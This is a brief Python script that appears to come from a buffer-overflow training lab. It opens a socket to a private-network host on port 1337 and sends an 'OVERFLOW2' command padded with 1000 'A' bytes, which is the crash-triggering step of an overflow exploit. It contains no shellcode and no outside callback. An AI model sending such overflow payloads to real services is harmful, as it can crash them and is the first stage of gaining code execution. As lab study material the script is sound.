#!/usr/bin/env python3

import socket, struct
host, port = '10.10.100.108', 1337
command = b'OVERFLOW2 '
payload = b''.join(
        [
        command,
        b'A' * 1000,
        ])

with socket.socket() as s:
        s.connect((host, port))
        s.send(payload)
